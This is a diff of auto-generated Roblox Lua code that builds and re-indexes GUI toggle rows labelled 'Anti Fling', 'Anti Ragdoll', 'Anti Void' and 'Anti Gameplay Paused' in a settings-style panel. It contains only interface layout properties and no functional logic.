+G2L["133"] = Instance.new("UIPadding", G2L["129"]);
+G2L["133"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling
+G2L["134"] = Instance.new("Frame", G2L["122"]);
+G2L["134"]["BorderSizePixel"] = 0;
+G2L["134"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["134"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["134"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["134"]["Name"] = [[fling]];
+G2L["134"]["LayoutOrder"] = 2;
+G2L["134"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button
+G2L["135"] = Instance.new("TextButton", G2L["134"]);
+G2L["135"]["BorderSizePixel"] = 0;
+G2L["135"]["TextTransparency"] = 1;
+G2L["135"]["TextSize"] = 14;
+G2L["135"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["135"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["135"]["ZIndex"] = 50;
+G2L["135"]["BackgroundTransparency"] = 1;
+G2L["135"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["135"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.UIPadding
+G2L["136"] = Instance.new("UIPadding", G2L["135"]);
+G2L["136"]["PaddingTop"] = UDim.new(0, 3);
+G2L["136"]["PaddingRight"] = UDim.new(0, 3);
+G2L["136"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["136"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame
+G2L["137"] = Instance.new("Frame", G2L["135"]);
+G2L["137"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["137"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["137"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["137"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["137"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.outlineStroke
+G2L["138"] = Instance.new("UIStroke", G2L["137"]);
+G2L["138"]["Thickness"] = 2;
+G2L["138"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade
+G2L["139"] = Instance.new("CanvasGroup", G2L["137"]);
+G2L["139"]["BorderSizePixel"] = 0;
+G2L["139"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["139"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["139"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["139"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade.UIGradient
+G2L["13a"] = Instance.new("UIGradient", G2L["139"]);
+G2L["13a"]["Rotation"] = 90;
+G2L["13a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text
+G2L["13b"] = Instance.new("TextLabel", G2L["134"]);
+G2L["13b"]["TextWrapped"] = true;
+G2L["13b"]["ZIndex"] = 10;
+G2L["13b"]["BorderSizePixel"] = 0;
+G2L["13b"]["TextSize"] = 14;
+G2L["13b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["13b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13b"]["BackgroundTransparency"] = 1;
+G2L["13b"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13b"]["Text"] = [[Anti Fling]];
+G2L["13b"]["Name"] = [[text]];
+G2L["13b"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.UIPadding
+G2L["13c"] = Instance.new("UIPadding", G2L["13b"]);
+G2L["13c"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.text
+G2L["13d"] = Instance.new("UIStroke", G2L["13b"]);
+G2L["13d"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.UIPadding
+G2L["13e"] = Instance.new("UIPadding", G2L["134"]);
+G2L["13e"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll
+G2L["13f"] = Instance.new("Frame", G2L["122"]);
+G2L["13f"]["BorderSizePixel"] = 0;
+G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13f"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["13f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13f"]["Name"] = [[ragdoll]];
+G2L["13f"]["LayoutOrder"] = 4;
+G2L["13f"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button
+G2L["140"] = Instance.new("TextButton", G2L["13f"]);
+G2L["140"]["BorderSizePixel"] = 0;
+G2L["140"]["TextTransparency"] = 1;
+G2L["140"]["TextSize"] = 14;
+G2L["140"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["140"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["140"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["140"]["ZIndex"] = 50;
+G2L["140"]["BackgroundTransparency"] = 1;
+G2L["140"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["140"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["140"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.UIPadding
+G2L["141"] = Instance.new("UIPadding", G2L["140"]);
+G2L["141"]["PaddingTop"] = UDim.new(0, 3);
+G2L["141"]["PaddingRight"] = UDim.new(0, 3);
+G2L["141"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["141"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame
+G2L["142"] = Instance.new("Frame", G2L["140"]);
+G2L["142"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["142"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["142"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["142"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["142"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.outlineStroke
+G2L["143"] = Instance.new("UIStroke", G2L["142"]);
+G2L["143"]["Thickness"] = 2;
+G2L["143"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade
+G2L["144"] = Instance.new("CanvasGroup", G2L["142"]);
+G2L["144"]["BorderSizePixel"] = 0;
+G2L["144"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["144"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["144"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["144"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["144"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade.UIGradient
+G2L["145"] = Instance.new("UIGradient", G2L["144"]);
+G2L["145"]["Rotation"] = 90;
+G2L["145"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text
+G2L["146"] = Instance.new("TextLabel", G2L["13f"]);
+G2L["146"]["TextWrapped"] = true;
+G2L["146"]["ZIndex"] = 10;
+G2L["146"]["BorderSizePixel"] = 0;
+G2L["146"]["TextSize"] = 14;
+G2L["146"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["146"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["146"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["146"]["BackgroundTransparency"] = 1;
+G2L["146"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["146"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["146"]["Text"] = [[Anti Ragdoll]];
+G2L["146"]["Name"] = [[text]];
+G2L["146"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.UIPadding
+G2L["147"] = Instance.new("UIPadding", G2L["146"]);
+G2L["147"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.text
+G2L["148"] = Instance.new("UIStroke", G2L["146"]);
+G2L["148"]["Name"] = [[text]];
+
+
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.UIPadding
-G2L["11b"] = Instance.new("UIPadding", G2L["111"]);
-G2L["11b"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["149"] = Instance.new("UIPadding", G2L["13f"]);
+G2L["149"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void
-G2L["11c"] = Instance.new("Frame", G2L["f4"]);
-G2L["11c"]["BorderSizePixel"] = 0;
-G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11c"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["11c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["11c"]["Name"] = [[void]];
-G2L["11c"]["LayoutOrder"] = 2;
-G2L["11c"]["BackgroundTransparency"] = 1;
+G2L["14a"] = Instance.new("Frame", G2L["122"]);
+G2L["14a"]["BorderSizePixel"] = 0;
+G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14a"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["14a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14a"]["Name"] = [[void]];
+G2L["14a"]["LayoutOrder"] = 2;
+G2L["14a"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button
-G2L["11d"] = Instance.new("TextButton", G2L["11c"]);
-G2L["11d"]["BorderSizePixel"] = 0;
-G2L["11d"]["TextTransparency"] = 1;
-G2L["11d"]["TextSize"] = 14;
-G2L["11d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["11d"]["ZIndex"] = 50;
-G2L["11d"]["BackgroundTransparency"] = 1;
-G2L["11d"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["11d"]["Name"] = [[button]];
+G2L["14b"] = Instance.new("TextButton", G2L["14a"]);
+G2L["14b"]["BorderSizePixel"] = 0;
+G2L["14b"]["TextTransparency"] = 1;
+G2L["14b"]["TextSize"] = 14;
+G2L["14b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14b"]["ZIndex"] = 50;
+G2L["14b"]["BackgroundTransparency"] = 1;
+G2L["14b"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["14b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14b"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.UIPadding
-G2L["11e"] = Instance.new("UIPadding", G2L["11d"]);
-G2L["11e"]["PaddingTop"] = UDim.new(0, 3);
-G2L["11e"]["PaddingRight"] = UDim.new(0, 3);
-G2L["11e"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["11e"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["14c"] = Instance.new("UIPadding", G2L["14b"]);
+G2L["14c"]["PaddingTop"] = UDim.new(0, 3);
+G2L["14c"]["PaddingRight"] = UDim.new(0, 3);
+G2L["14c"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["14c"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame
-G2L["11f"] = Instance.new("Frame", G2L["11d"]);
-G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["11f"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["11f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["11f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["11f"]["Name"] = [[toggleFrame]];
+G2L["14d"] = Instance.new("Frame", G2L["14b"]);
+G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["14d"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["14d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["14d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["14d"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.outlineStroke
-G2L["120"] = Instance.new("UIStroke", G2L["11f"]);
-G2L["120"]["Thickness"] = 2;
-G2L["120"]["Name"] = [[outlineStroke]];
+G2L["14e"] = Instance.new("UIStroke", G2L["14d"]);
+G2L["14e"]["Thickness"] = 2;
+G2L["14e"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade
-G2L["121"] = Instance.new("CanvasGroup", G2L["11f"]);
-G2L["121"]["BorderSizePixel"] = 0;
-G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["121"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["121"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["121"]["Name"] = [[toggleFade]];
+G2L["14f"] = Instance.new("CanvasGroup", G2L["14d"]);
+G2L["14f"]["BorderSizePixel"] = 0;
+G2L["14f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14f"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["14f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14f"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade.UIGradient
-G2L["122"] = Instance.new("UIGradient", G2L["121"]);
-G2L["122"]["Rotation"] = 90;
-G2L["122"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["150"] = Instance.new("UIGradient", G2L["14f"]);
+G2L["150"]["Rotation"] = 90;
+G2L["150"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text
-G2L["123"] = Instance.new("TextLabel", G2L["11c"]);
-G2L["123"]["TextWrapped"] = true;
-G2L["123"]["ZIndex"] = 10;
-G2L["123"]["BorderSizePixel"] = 0;
-G2L["123"]["TextSize"] = 14;
-G2L["123"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["123"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["123"]["BackgroundTransparency"] = 1;
-G2L["123"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["123"]["Text"] = [[Anti Void]];
-G2L["123"]["Name"] = [[text]];
-G2L["123"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.UIPadding
-G2L["124"] = Instance.new("UIPadding", G2L["123"]);
-G2L["124"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.text
-G2L["125"] = Instance.new("UIStroke", G2L["123"]);
-G2L["125"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.UIPadding
-G2L["126"] = Instance.new("UIPadding", G2L["11c"]);
-G2L["126"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused
-G2L["127"] = Instance.new("Frame", G2L["f4"]);
-G2L["127"]["BorderSizePixel"] = 0;
-G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["127"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["127"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["127"]["Name"] = [[gameplaypaused]];
-G2L["127"]["LayoutOrder"] = 2;
-G2L["127"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button
-G2L["128"] = Instance.new("TextButton", G2L["127"]);
-G2L["128"]["BorderSizePixel"] = 0;
-G2L["128"]["TextTransparency"] = 1;
-G2L["128"]["TextSize"] = 14;
-G2L["128"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["128"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["128"]["ZIndex"] = 50;
-G2L["128"]["BackgroundTransparency"] = 1;
-G2L["128"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["128"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.UIPadding
-G2L["129"] = Instance.new("UIPadding", G2L["128"]);
-G2L["129"]["PaddingTop"] = UDim.new(0, 3);
-G2L["129"]["PaddingRight"] = UDim.new(0, 3);
-G2L["129"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["129"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame
-G2L["12a"] = Instance.new("Frame", G2L["128"]);
-G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["12a"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["12a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["12a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["12a"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.outlineStroke
-G2L["12b"] = Instance.new("UIStroke", G2L["12a"]);
-G2L["12b"]["Thickness"] = 2;
-G2L["12b"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade
-G2L["12c"] = Instance.new("CanvasGroup", G2L["12a"]);
-G2L["12c"]["BorderSizePixel"] = 0;
-G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["12c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["12c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["12c"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade.UIGradient
-G2L["12d"] = Instance.new("UIGradient", G2L["12c"]);
-G2L["12d"]["Rotation"] = 90;
-G2L["12d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text
-G2L["12e"] = Instance.new("TextLabel", G2L["127"]);
-G2L["12e"]["TextWrapped"] = true;
-G2L["12e"]["ZIndex"] = 10;
-G2L["12e"]["BorderSizePixel"] = 0;
-G2L["12e"]["TextSize"] = 14;
-G2L["12e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["12e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["12e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["12e"]["BackgroundTransparency"] = 1;
-G2L["12e"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["12e"]["Text"] = [[Anti Gameplay Paused]];
-G2L["12e"]["Name"] = [[text]];
-G2L["12e"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.UIPadding
-G2L["12f"] = Instance.new("UIPadding", G2L["12e"]);
-G2L["12f"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.text
-G2L["130"] = Instance.new("UIStroke", G2L["12e"]);
-G2L["130"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.UIPadding
-G2L["131"] = Instance.new("UIPadding", G2L["127"]);
-G2L["131"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---
-G2L["132"] = Instance.new("Frame", G2L["f4"]);
-G2L["132"]["BorderSizePixel"] = 0;
-G2L["132"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["132"]["Size"] = UDim2.new(1, 0, 0, 10);
-G2L["132"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["132"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["132"]["Name"] = [[---DIVIDER---]];
-G2L["132"]["LayoutOrder"] = 3;
-G2L["132"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame
-G2L["133"] = Instance.new("Frame", G2L["132"]);
-G2L["133"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["133"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["133"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["133"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["133"]["Name"] = [[dividerFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
-G2L["134"] = Instance.new("UIStroke", G2L["133"]);
-G2L["134"]["Thickness"] = 2;
-G2L["134"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
-G2L["135"] = Instance.new("CanvasGroup", G2L["133"]);
-G2L["135"]["BorderSizePixel"] = 0;
-G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["135"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["135"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["135"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
-G2L["136"] = Instance.new("UIGradient", G2L["135"]);
-G2L["136"]["Rotation"] = 90;
-G2L["136"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
-G2L["137"] = Instance.new("UIStroke", G2L["133"]);
-G2L["137"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["137"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
-G2L["138"] = Instance.new("UICorner", G2L["133"]);
-
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.UIPadding
-G2L["139"] = Instance.new("UIPadding", G2L["132"]);
-G2L["139"]["PaddingTop"] = UDim.new(0, 3);
-G2L["139"]["PaddingRight"] = UDim.new(0, 8);
-G2L["139"]["PaddingLeft"] = UDim.new(0, 8);
-G2L["139"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick
-G2L["13a"] = Instance.new("Frame", G2L["f4"]);
-G2L["13a"]["BorderSizePixel"] = 0;
-G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["13a"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["13a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["13a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13a"]["Name"] = [[kick]];
